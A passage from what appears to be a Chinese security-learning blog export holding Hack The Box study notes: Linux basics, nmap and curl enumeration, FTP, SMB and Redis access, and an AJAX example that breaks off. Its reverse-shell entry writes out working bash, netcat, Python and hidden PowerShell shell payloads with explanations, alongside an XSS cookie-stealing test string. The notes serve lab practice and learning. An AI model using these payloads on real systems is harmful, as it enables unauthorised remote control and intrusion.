目录下。2．通过修改.bashrc文件来设置环境变量，赋予某个用户权限使用此环境变量。3．在终端界面,执行 vi 命令 在 .bashrc文件末尾加入 export PATH=$PATH:/usr/local/apache/bin 命令。4．保存并退出文件，执行 source .bashrc 命令让其环境变量生效。5．如果要让所有用户可用这个环境变量，则以上第2、3步的修改和生效文件由.bashrc改为/etc/profile。提示：如果 环 境 变 量作 为 临 时 使用 ， 还可 以 直 接 在终 端 界 面 上直 接 执 行 export PATH=$PATH:/usr/local/apache/bin 命令。</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>msf插件</title>
      <link href="/2023/06/11/msf_plugins/"/>
      <url>/2023/06/11/msf_plugins/</url>
      
        <content type="html"><![CDATA[<h2 id="msf插件"><a href="#msf插件" class="headerlink" title="msf插件"></a>msf插件</h2><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td><a href="https://nmap.org/">nMap (pre-installed)</a></td><td><a href="https://sectools.org/tool/nexpose/">NexPose (pre-installed)</a></td><td><a href="https://www.tenable.com/products/nessus">Nessus (pre-installed)</a></td></tr><tr><td><a href="http://blog.gentilkiwi.com/mimikatz">Mimikatz (pre-installed V.1)</a></td><td><a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Stdapi/Stdapi">Stdapi (pre-installed)</a></td><td><a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation">Railgun</a></td></tr><tr><td><a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/priv/priv.rb">Priv</a></td><td><a href="https://www.offensive-security.com/metasploit-unleashed/fun-incognito/">Incognito (pre-installed)</a></td><td><a href="https://github.com/darkoperator/Metasploit-Plugins">Darkoperator’s</a></td></tr></tbody></table><span id="more"></span>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux</title>
      <link href="/2023/06/11/linux/"/>
      <url>/2023/06/11/linux/</url>
      
        <content type="html"><![CDATA[<h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><h3 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h3><table><thead><tr><th><code>/</code></th><th>顶级目录是根文件系统，包含在挂载其他文件系统之前引导操作系统所需的所有文件，以及引导其他文件系统所需的文件。引导后，所有其他文件系统都作为根目录挂载在标准挂载点。</th></tr></thead><tbody><tr><td><code>/bin</code></td><td>包含基本的命令二进制文件。</td></tr><tr><td><code>/boot</code></td><td>由静态引导加载程序、内核可执行文件和引导 Linux 操作系统所需的文件组成。</td></tr><tr><td><code>/dev</code></td><td>包含设备文件，以便于访问连接到系统的每个硬件设备。</td></tr><tr><td><code>/etc</code></td><td>本地系统配置文件。已安装应用程序的配置文件也可以保存在此处。</td></tr><tr><td><code>/home</code></td><td>系统上的每个用户都有一个用于存储的子目录。</td></tr><tr><td><code>/lib</code></td><td>系统引导所需的共享库文件。</td></tr><tr><td><code>/media</code></td><td>外部可移动媒体设备（如 USB 驱动器）安装在此处。</td></tr><tr><td><code>/mnt</code></td><td>常规文件系统的临时挂载点。</td></tr><tr><td><code>/opt</code></td><td>可选文件（如第三方工具）可以保存在此处。</td></tr><tr><td><code>/root</code></td><td>根用户的主目录。</td></tr><tr><td><code>/sbin</code></td><td>此目录包含用于系统管理的可执行文件（二进制系统文件）。</td></tr><tr><td><code>/tmp</code></td><td>操作系统和许多程序使用此目录来存储临时文件。此目录通常在系统启动时清除，其他时间可能会删除，没有任何警告。</td></tr><tr><td><code>/usr</code></td><td>包含可执行文件、库、man 文件等。</td></tr><tr><td><code>/var</code></td><td>此目录包含可变数据文件，例如日志文件、电子邮件收件箱、Web 应用程序相关文件、cron 文件等。</td></tr></tbody></table><span id="more"></span><h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h3><table><thead><tr><th><code>\d</code></th><th>日期（6月&lt;&gt;日星期一）</th></tr></thead><tbody><tr><td>&#96;\D</td><td></td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杂记</title>
      <link href="/2023/06/11/other_2/"/>
      <url>/2023/06/11/other_2/</url>
      
        <content type="html"><![CDATA[<h1 id="杂记"><a href="#杂记" class="headerlink" title="杂记"></a>杂记</h1><p>学习过程中的遇到的一些工具或指令</p><p>###http-enum&#x3D;&#x3D;脚本枚举</p><p>nmap使用&#x3D;&#x3D;http-enum&#x3D;&#x3D;脚本枚举，该脚本可用于枚举常见的 Web 应用程序目录。</p><p><code>-oA</code> 保存扫描结果到指定文件</p><pre><code>Tanin@htb[/htb]$ nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.42.190 Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-16 23:41 ESTNmap scan report for 10.129.42.190Host is up (0.11s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Apache httpd &lt;REDACTED&gt; ((Ubuntu))|_http-server-header: Apache/&lt;REDACTED&gt; (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 19.23 seconds</code></pre><span id="more"></span><h3 id="xmllint-美化xml文件的输出"><a href="#xmllint-美化xml文件的输出" class="headerlink" title="xmllint 美化xml文件的输出"></a>xmllint 美化xml文件的输出</h3><pre><code>Tanin@htb[/htb]$ curl -s http://10.129.42.190/nibbleblog/content/private/users.xml | xmllint  --format -&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;users&gt;  &lt;user username=&quot;admin&quot;&gt;    &lt;id type=&quot;integer&quot;&gt;0&lt;/id&gt;    &lt;session_fail_count type=&quot;integer&quot;&gt;2&lt;/session_fail_count&gt;    &lt;session_date type=&quot;integer&quot;&gt;1608182184&lt;/session_date&gt;  &lt;/user&gt;  &lt;blacklist type=&quot;string&quot; ip=&quot;10.10.10.1&quot;&gt;    &lt;date type=&quot;integer&quot;&gt;1512964659&lt;/date&gt;    &lt;fail_count type=&quot;integer&quot;&gt;1&lt;/fail_count&gt;  &lt;/blacklist&gt;  &lt;blacklist type=&quot;string&quot; ip=&quot;10.10.14.2&quot;&gt;    &lt;date type=&quot;integer&quot;&gt;1608182171&lt;/date&gt;    &lt;fail_count type=&quot;integer&quot;&gt;5&lt;/fail_count&gt;  &lt;/blacklist&gt;&lt;/users&gt;</code></pre><p>   在<code>curl</code>命令中，选项<code>-s</code>表示”silent”（静默）或者”silent mode”（静默模式）。它告诉<code>curl</code>不要输出任何进度或错误信息，只返回请求的结果。使用<code>-s</code>选项可以在脚本或命令行中以静默方式使用<code>curl</code>，只获取结果而不打印其他信息。</p><h3 id="提升shell"><a href="#提升shell" class="headerlink" title="提升shell"></a>提升shell</h3><p>python3 -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p><p>注：根据python版本</p><ul><li><code>python3</code>: 运行 Python 3 解释器。</li><li><code>-c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code>: 使用 <code>-c</code> 参数指定要在命令行中执行的 Python 代码。在这个代码块中，执行了以下操作：<ul><li><code>import pty</code>: 导入 <code>pty</code> 模块，该模块提供了伪终端（pseudo-terminal）的功能。</li><li><code>pty.spawn(&quot;/bin/bash&quot;)</code>: 使用 <code>pty.spawn</code> 函数将当前终端转变为一个交互式的 bash shell。它会将当前进程变成一个子进程，并将子进程的输入和输出连接到一个伪终端，以实现交互式的终端功能。</li></ul></li></ul><p>使用这个脚本，您可以在当前终端创建一个交互式的 bash shell。这对于在一些情况下（例如，当您只能访问一个非交互式 shell）需要获取一个完整的交互式终端会话时非常有用。运行脚本后，您将能够使用 bash 的功能，并与终端进行交互，包括使用命令历史记录、自动补全等。</p><h3 id="HTML注入"><a href="#HTML注入" class="headerlink" title="HTML注入"></a>HTML注入</h3><pre><code>&lt;img src=/ onerror=alert(document.cookie)&gt;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Reverse Shell</title>
      <link href="/2023/06/11/reverse_shell/"/>
      <url>/2023/06/11/reverse_shell/</url>
      
        <content type="html"><![CDATA[<h1 id="初见反弹shell"><a href="#初见反弹shell" class="headerlink" title="初见反弹shell"></a>初见反弹shell</h1><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md</a></p><h3 id="反弹类型："><a href="#反弹类型：" class="headerlink" title="反弹类型："></a>反弹类型：</h3><table><thead><tr><th><code>Reverse Shell</code></th><th>连接回我们的系统，并通过反向连接让我们控制。</th></tr></thead><tbody><tr><td><code>Bind Shell</code></td><td>等待我们连接到它，并在我们这样做后给我们控制权。</td></tr><tr><td><code>Web Shell</code></td><td>通过 Web 服务器进行通信，通过 HTTP 参数接受我们的命令，执行它们，然后打印输出。</td></tr></tbody></table><pre><code>Tanin@htb[/htb]$ nc -lvnp 1234listening on [any] 1234 ...</code></pre><p>我们使用的标志如下：</p><h3 id="nc标志"><a href="#nc标志" class="headerlink" title="nc标志"></a>nc标志</h3><table><thead><tr><th>旗</th><th>描述</th></tr></thead><tbody><tr><td><code>-l</code></td><td>收听模式，等待连接连接到我们。</td></tr><tr><td><code>-v</code></td><td>详细模式，以便我们知道何时收到连接。</td></tr><tr><td><code>-n</code></td><td>禁用 DNS 解析并仅从 IP 连接到 IP，以加快连接速度。</td></tr><tr><td><code>-p 1234</code></td><td>端口号正在侦听，应将反向连接发送到。<code>netcat</code></td></tr></tbody></table><span id="more"></span><p>##Reverse Shell</p><h3 id="载荷1："><a href="#载荷1：" class="headerlink" title="载荷1："></a>载荷1：</h3><pre><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1&#39;</code></pre><p>在命令行中，<code>bash -c</code> 和 <code>-i</code> 是 <code>bash</code> shell 的选项和参数。</p><ul><li><code>-c</code> 选项用于在命令行上执行指定的命令。它允许您在不启动新的交互式 <code>bash</code> 会话的情况下执行一条命令。后面应跟随要执行的命令。例如，<code>bash -c &#39;echo Hello, World!&#39;</code> 将执行 <code>echo Hello, World!</code> 这个命令，并在输出中打印 “Hello, World!”。</li><li><code>-i</code> 参数是交互式模式的意思。它使 <code>bash</code> shell 在启动后成为交互式的，以便用户可以与 shell 进行交互。通常在需要与 shell 进行交互的脚本或命令中使用 <code>-i</code> 参数。例如，<code>bash -i</code> 将启动一个交互式 <code>bash</code> shell。</li></ul><p>在提供的命令中，<code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/&#123;ip&#125; 0&gt;&amp;1&#39;</code> 结合了这两个选项和参数。它使用 <code>-c</code> 选项来执行指定的命令，而该命令是 <code>bash -i &gt;&amp; /dev/tcp/&#123;ip&#125; 0&gt;&amp;1</code>。这将启动一个交互式 <code>bash</code> shell，并将其标准输出（文件描述符 1）重定向到 <code>/dev/tcp/&#123;ip&#125;</code>，并将标准输入（文件描述符 0）重定向到标准输出。这种配置通常用于建立反向 shell 连接。请注意，<code>&#123;ip&#125;</code> 应该被替换为实际的 IP 地址。</p><h2 id="Bind-Shell"><a href="#Bind-Shell" class="headerlink" title="Bind Shell"></a>Bind Shell</h2><h3 id="载荷2："><a href="#载荷2：" class="headerlink" title="载荷2："></a>载荷2：</h3><pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 1234 &gt;/tmp/f</code></pre><p>提供的命令涉及一系列操作，包括创建命名管道（named pipe），使用<code>cat</code>命令将管道的输出传递给<code>/bin/sh</code>并建立反向 shell 连接。</p><p>具体来说，这个命令的含义如下：</p><ol><li><code>rm /tmp/f</code>: 删除 <code>/tmp/f</code> 文件（如果存在）。</li><li><code>mkfifo /tmp/f</code>: 创建一个命名管道文件 <code>/tmp/f</code>。</li><li><code>cat /tmp/f | /bin/sh -i 2&gt;&amp;1</code>: 使用<code>cat</code>命令读取管道 <code>/tmp/f</code> 的内容，并将其传递给<code>/bin/sh</code>来执行，<code>-i</code>选项表示以交互式方式运行 shell。</li><li><code>nc 10.10.10.10 1234 &gt;/tmp/f</code>: 使用<code>nc</code>命令（netcat）建立到 <code>10.10.10.10</code> IP 地址、端口 <code>1234</code> 的反向 shell 连接，并将连接的输入输出重定向到管道 <code>/tmp/f</code>。</li></ol><p>总体上，这个命令的目的是在本地主机上建立一个反向 shell 连接，将输入输出流通过命名管道 <code>/tmp/f</code> 传输，并通过<code>nc</code>命令将流重定向到远程主机 <code>10.10.10.10</code> 的端口 <code>1234</code> 上。</p><h4 id="什么是管道文件："><a href="#什么是管道文件：" class="headerlink" title="什么是管道文件："></a>什么是管道文件：</h4><p>管道文件（Named pipe）是一种特殊类型的文件，它允许不同进程之间通过文件系统进行通信。它提供了一个双向的、先进先出（FIFO）的通信通道，允许一个进程将数据写入管道的一端，而另一个进程可以从管道的另一端读取相同的数据。</p><p>管道文件在操作系统中以文件的形式存在，但实际上它们并不存储任何数据，而是将数据直接传递给读取它们的进程。<strong>当一个进程写入管道时，数据将被缓存并传递给读取进程，以便进程之间进行通信</strong>。</p><p>管道文件的创建使用特定的命令或系统调用，如在Linux中的<code>mkfifo</code>命令或<code>mkfifo()</code>系统调用。它们可以在命令行中使用，也可以在脚本或程序中以编程方式使用。</p><p>管道文件在进程间通信（IPC）中非常有用，特别是当需要在不同的进程之间传递数据或进行协作时。它们可以用于多个进程之间的实时数据传输、数据处理管道和进程间同步等场景。管道文件提供了一种简单而有效的方式来实现进程之间的通信，而无需使用复杂的进程间通信机制。</p><h3 id="载荷3："><a href="#载荷3：" class="headerlink" title="载荷3："></a>载荷3：</h3><pre><code>python -c &#39;exec(&quot;&quot;&quot;import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((&quot;0.0.0.0&quot;,1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())&quot;&quot;&quot;)&#39;</code></pre><p>整理一下：</p><pre><code>python -c &#39;exec(&quot;&quot;&quot;import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((&quot;0.0.0.0&quot;,1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())&quot;&quot;&quot;)&#39;</code></pre><p>chatgpt解释：</p><pre><code>import socket as s, subprocess as sp# 导入所需的模块，包括 socket 和 subprocesss1 = s.socket(s.AF_INET, s.SOCK_STREAM)# 创建一个 TCP socket 对象s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1)# 设置 socket 选项，允许地址复用s1.bind((&quot;0.0.0.0&quot;, 1234))# 将 socket 绑定到本地地址和指定的端口号s1.listen(1)# 开始监听传入的连接请求，参数 1 表示允许的最大连接数为 1c, a = s1.accept()# 接受客户端的连接请求，并返回一个新的 socket 对象和客户端的地址while True:    d = c.recv(1024).decode()    # 接收从客户端发送过来的数据（命令），并进行解码    p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)    # 使用 subprocess.Popen 创建一个新的子进程，并执行接收到的命令    c.sendall(p.stdout.read() + p.stderr.read())    # 将子进程的标准输出和标准错误输出发送回客户端</code></pre><p>这个脚本创建了一个 TCP socket 服务器，监听在本地地址（”0.0.0.0”）的端口号 1234 上。当客户端连接成功后，它将无限循环等待客户端发送的命令。每次接收到命令后，它使用 <code>subprocess.Popen</code> 创建一个新的子进程，并在子进程中执行该命令。然后，脚本将子进程的标准输出和标准错误输出发送回客户端。</p><p> <code> p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)</code>:</p><p>这行代码使用 <code>subprocess.Popen</code> 创建一个新的子进程，并执行从客户端接收到的命令。</p><p>具体解析如下：</p><ul><li><code>d</code> 是从客户端接收到的命令字符串，它将作为子进程要执行的命令。</li><li><code>shell=True</code> 表示要在子进程中使用系统的默认 shell 来解释和执行命令。</li><li><code>stdout=sp.PIPE</code> 指定子进程的标准输出将通过管道进行捕获，以便稍后读取。</li><li><code>stderr=sp.PIPE</code> 指定子进程的标准错误输出也通过管道进行捕获，以便稍后读取。</li><li><code>stdin=sp.PIPE</code> 表示可以通过管道将输入提供给子进程的标准输入。</li></ul><p>综合起来，这行代码的作用是创建一个新的子进程，使用系统的默认 shell 执行从客户端接收到的命令，并通过管道捕获子进程的标准输出、标准错误输出和标准输入。这样，我们可以在主程序中通过管道读取子进程的输出和错误信息，以及将输入发送给子进程。</p><p>通过这种方式，父进程可以与子进程进行双向通信，向子进程发送输入，并获取子进程的输出和错误信息。这在反向 shell 的实现中非常常见，允许远程控制端发送命令给被控制端，并获取执行结果。</p><p>###载荷4：</p><pre><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close();</code></pre><p>这个脚本使用 PowerShell 创建一个反向 shell 服务端，监听在指定的端口号 1234 上，并隐藏其执行过程。</p><p>以下是对每行代码的解析：</p><ul><li><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command</code>: 这是执行 PowerShell 脚本的命令行参数，它设置了一些选项来隐藏 PowerShell 窗口并绕过执行策略。</li><li><code>$listener = [System.Net.Sockets.TcpListener]1234; $listener.start();</code>: 创建一个 <code>TcpListener</code> 对象并将其绑定到本地地址的端口 1234 上，并开始监听传入的连接请求。</li><li><code>$client = $listener.AcceptTcpClient();</code>: 接受客户端的连接请求，并返回一个新的 <code>TcpClient</code> 对象，用于与客户端进行通信。</li><li><code>$stream = $client.GetStream();</code>: 获取与客户端连接的网络流，用于发送和接收数据。</li><li><code>[byte[]]$bytes = 0..65535|%&#123;0&#125;;</code>: 创建一个字节数组，用于存储从客户端接收的数据。</li><li><code>while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)</code>: 进入一个无限循环，不断接收从客户端发送的数据。</li><li><code>$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);</code>: 将接收到的字节数组转换为字符串，以便获取从客户端发送的命令。</li><li><code>$sendback = (iex $data 2&gt;&amp;1 | Out-String );</code>: 执行从客户端接收到的命令，并将输出结果保存到 <code>$sendback</code> 变量中。</li><li><code>$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot; &quot;;</code>: 在输出结果后添加当前 PowerShell 会话的路径信息。</li><li><code>$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);</code>: 将输出结果转换为 ASCII 字节，以便发送给客户端。</li><li><code>$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()</code>: 将字节发送回客户端，并刷新网络流</li></ul><p>##升级 TTY</p><p>通过Netcat连接到shell后，我们会注意到我们只能键入命令或退格键，但我们不能向左或向右移动文本光标来编辑我们的命令，也不能上下访问命令历史记录。为了能够做到这一点，我们需要升级我们的 TTY。这可以通过将我们的终端 TTY 与远程 TTY 映射来实现。</p><p>有多种方法可以做到这一点。出于我们的目的，我们将使用该方法。在我们的 shell 中，我们将使用以下命令使用 python 将我们的 shell 类型升级到完整的 TTY：<code>python/stty``netcat</code></p><p>  升级 TTY</p><pre><code>Tanin@htb[/htb]$ python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p>运行此命令后，我们将点击后台我们的 shell 并返回我们的本地终端，并输入以下命令：<code>ctrl+z``stty</code></p><pre><code>www-data@remotehost$ ^ZTanin@htb[/htb]$ stty raw -echoTanin@htb[/htb]$ fg[Enter][Enter]www-data@remotehost$</code></pre><p>一旦我们击中，它将把我们的外壳带回前台。此时，终端将显示一个空行。我们可以再次点击以返回我们的外壳或输入并按回车键将其带回。此时，我们将拥有一个完全工作的TTY shell，其中包含命令历史记录和其他所有内容。<code>fg``netcat``enter``reset</code></p><p>我们可能会注意到我们的外壳没有覆盖整个终端。为了解决这个问题，我们需要找出一些变量。我们可以在系统上打开另一个终端窗口，最大化窗口或使用我们想要的任何大小，然后输入以下命令来获取我们的变量：</p><pre><code>Tanin@htb[/htb]$ echo $TERMxterm-256color</code></pre><pre><code>Tanin@htb[/htb]$ stty size67 318</code></pre><p>第一个命令向我们显示了变量，第二个命令分别向我们显示了 和 的值。现在我们有了变量，我们可以回到我们的 shell 并使用以下命令来纠正它们：<code>TERM``rows``columns``netcat</code></p><pre><code>www-data@remotehost$ export TERM=xterm-256colorwww-data@remotehost$ stty rows 67 columns 318</code></pre><p>一旦我们这样做了，我们应该有一个使用终端全部功能的 shell，就像 SSH 连接一样。<code>netcat</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>协议连接</title>
      <link href="/2023/06/11/stage_mark_1/"/>
      <url>/2023/06/11/stage_mark_1/</url>
      
        <content type="html"><![CDATA[<p>###FTP协议：</p><p>下载：<code> apt install ftp -y</code></p><p>使用：<code>ftp -h</code>:</p><blockquote><p>ftp -h<br>Usage: { ftp | pftp }[-46pinegvtd] [ hostname]<br>-4: use IPv4 addresses only<br>-6: use IPv6，nothing else<br>-p: enable passive mode ( default for pftp)-i: turn off prompting during mget<br>-n: inhibit auto-login<br>-e: disable readline support，if present-g: disable filename  globbing<br>-v: verbose mode<br>-t: enable packet tracing [nonfunctional]           -d: enable debugging</p></blockquote><p>连接：<code>ftp &#123;target_ip&#125;</code></p><span id="more"></span><p>​运行FTP服务的典型错误配置允许匿名帐户像任何其他经过身份验证的用户一样访问该服务。<code>anonymous</code>户名可以在提示符出现时输入，以任何密码作为后缀，因为服务将忽略此特定帐户的密码。</p><p>连接后使用<code>help</code>可以查看可用的命令，用<code>get</code>下载目标文件</p><p>###SMB协议：</p><blockquote><p>SMB是Server Message Block的缩写，是一种用于在计算机之间共享文件、打印机和其他资源的协议。SMB协议最初是由IBM开发的，现在由微软维护。SMB协议可以运行在TCP&#x2F;IP协议上，并支持文件和打印机的共享。在计算机网络中，SMB协议通常用于在不同操作系统之间进行文件共享，如Windows、Linux和Mac OS等。</p></blockquote><p>下载客户端：</p><p><code>apt-get install smbclient</code></p><p>尝试查看可用的域名:</p><p><code>[-L|--list=HOST] : Selecting the targeted host for the connection request.</code></p><p>其中：</p><blockquote><ul><li>ADMIN$ - Administrative shares are hidden network shares created by the Windows NT family of operating systems that allow system administrators to have remote access to every disk volume on a network-connected system. These shares may not be permanently deleted but may be disabled.</li><li>C$ - Administrative share for the C:\ disk volume. This is where the operating system is hosted.</li><li>IPC$ - The inter-process communication share. Used for inter-process communication via named pipes and is not part of the file system.</li><li>WorkShares - Custom share.</li></ul></blockquote><p>连接：</p><p><code>smbclient \\\\ &#123;target_ip&#125;\\&#123;target_host&#125;</code></p><blockquote><p><code>smbsilent</code> 是一个工具，用于枚举 SMB 服务器共享和共享内的文件夹，其中：</p><ul><li><code>-N</code> 表示进行无认证的 SMB 网络浏览</li><li><code>-L</code> 表示执行网络浏览（查看可用共享）</li></ul><p>而 <code>\\\\&#123;ip&#125;\\</code> 则是需要执行网络浏览的目标主机地址，其中 <code>ip</code> 是目标主机的 IP 地址。该命令用于枚举指定主机上的 SMB 共享。</p></blockquote><p>关于这些<code>\</code></p><blockquote><p>在Windows系统的命令行中，反斜杠 <code>\</code> 被用作转义字符，所以要在命令中输入反斜杠本身，需要使用两个反斜杠 <code>\\</code> 来转义。在这个命令中，输入的 <code>\\</code> 表示一个反斜杠字符。因此 <code>\\\\</code> 表示两个反斜杠字符，后面紧接着的 <code>&#123;ip&#125;</code> 是要替换成目标主机的 IP 地址。</p></blockquote><p>连接后的一些操作：</p><blockquote><p>ls : listing contents of the directories within the share<br>cd : changing current directories within the share<br>get : downloading the contents of the directories within the share<br>exit : exiting the smb shell</p></blockquote><h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis:"></a>Redis:</h3><p>​Redis是一个开源的内存数据存储系统，也被称为数据结构服务器。它支持各种数据结构，如字符串、哈希表、列表、集合等，并提供了广泛的客户端支持，可用于多种编程语言。Redis可以用作数据库、缓存、消息代理和排行榜等应用。它以速度和灵活性著称，并具有很高的可用性和可扩展性。Redis也支持数据持久化，可以将数据写入磁盘以便于重启后恢复数据。</p><p>下载 redis-cli:</p><p><code>sudo apt install redis-tools</code></p><p>用法：</p><blockquote><p>redis-cli –help<br>Usage: redis-cli [OPTIONS] [cmd [arg [arg …]]]<br> -h  Server hostname (default: 127.0.0.1).<br> -p  Server port (default: 6379).<br> -s  Server socket (overrides hostname and port).<br> -a  Password to use when connecting to the server.<br> -r  Execute specified command N times.<br> -i  When -r is used, waits  seconds per command.<br> It is possible to specify sub-second times like -i 0.1.<br> -n  Database number.<br> -x Read last argument from STDIN.<br> -d  Multi-bulk delimiter in for raw formatting (default: \n).<br> -c Enable cluster mode (follow -ASK and -MOVED redirections).<br> –raw Use raw formatting for replies (default when STDOUT is<br> not a tty).<br> –no-raw Force formatted output even when STDOUT is not a tty.<br> –csv Output in CSV format.<br> –stat Print rolling stats about server: mem, clients, …<br>In our case, we will only need to use the following switch for specifying the host that we need to connect to :<br>Let us connect to the redis server using the following command :<br>Upon a successful connection with the Redis server, we should be able to see a prompt in the terminal as<br>shown in the image above.<br>One of the basic Redis enumeration commands is info which returns information and statistics about the<br>Redis server. Since the output of this command is pretty long, I have snipped out the less-relevant<br>information :<br> –latency Enter a special mode continuously sampling latency.<br> –latency-history Like –latency but tracking latency changes over time.<br> Default time interval is 15 sec. Change it using -i.<br> –latency-dist Shows latency as a spectrum, requires xterm 256 colors.<br> Default time interval is 1 sec. Change it using -i.<br> –lru-test  Simulate a cache workload with an 80-20 distribution.<br> –slave Simulate a slave showing commands received from the master.<br> –rdb  Transfer an RDB dump from remote server to local file.<br> –pipe Transfer raw Redis protocol from stdin to server.<br> –pipe-timeout  In –pipe mode, abort with error if after sending all data.<br> no reply is received within  seconds.<br> Default timeout: 30. Use 0 to wait forever.<br> –bigkeys Sample Redis keys looking for big keys.<br> –scan List all keys using the SCAN command.<br> –pattern  Useful with –scan to specify a SCAN pattern.<br> –intrinsic-latency  Run a test to measure intrinsic system latency.<br> The test will run for the specified amount of seconds.<br> –eval  Send an EVAL command using the Lua script at .<br> –help Output this help and exit.<br> –version Output version and exit.</p></blockquote><p>连接：<code>redis-cli -h &#123;target_ip&#125;</code></p><p>登录后的一些操作：</p><p><code>info</code>:查看当前信息，在keysapce中可以看到存在的数据库及其索引</p><p><code>select  &#123;index&#125;</code>:输入要选择进入的数据库索引号</p><p><code>keys *</code>:列出数据库中的所有键</p><p><code>get &lt;key&gt;</code> : 获取键对应的值</p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杂记-前端Ajax</title>
      <link href="/2023/06/11/other_1/"/>
      <url>/2023/06/11/other_1/</url>
      
        <content type="html"><![CDATA[<p>当使用 Java Web 技术构建后端，并使用 AJAX 进行前后端交互时，以下是一个简单的示例：</p><p>###前端（使用 AJAX）：</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;title&gt;AJAX 示例&lt;/title&gt;  &lt;script src=&quot;https://code.jquery.com/jquery-3.6.0.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;  &lt;button id=&quot;getDataBtn&quot;&gt;获取数据&lt;/button&gt;  &lt;div id=&quot;result&quot;&gt;&lt;/div&gt;  &lt;script&gt;    $(document).ready(function() &#123;      // 当点击按钮时发送 AJAX 请求      $(&#39;#getDataBtn&#39;).click(function() &#123;        $.ajax(&#123;          url: &#39;backendServlet&#39;, // 后端的 Servlet 地址          type: &#39;GET&#39;,          dataType: &#39;json&#39;,          success: function(data) &#123;            // 请求成功时更新页面内容            $(&#39;#result&#39;).text(data.message);          &#125;,          error: function() &#123;            // 请求失败时显示错误信息            $(&#39;#result&#39;).text(&#39;请求失败&#39;);          &#125;        &#125;);      &#125;);    &#125;);  &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><span id="more"></span><p>后端（Java Servlet）：</p><pre><code class="java">import java.io.IOException;import javax.servlet.ServletException;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import 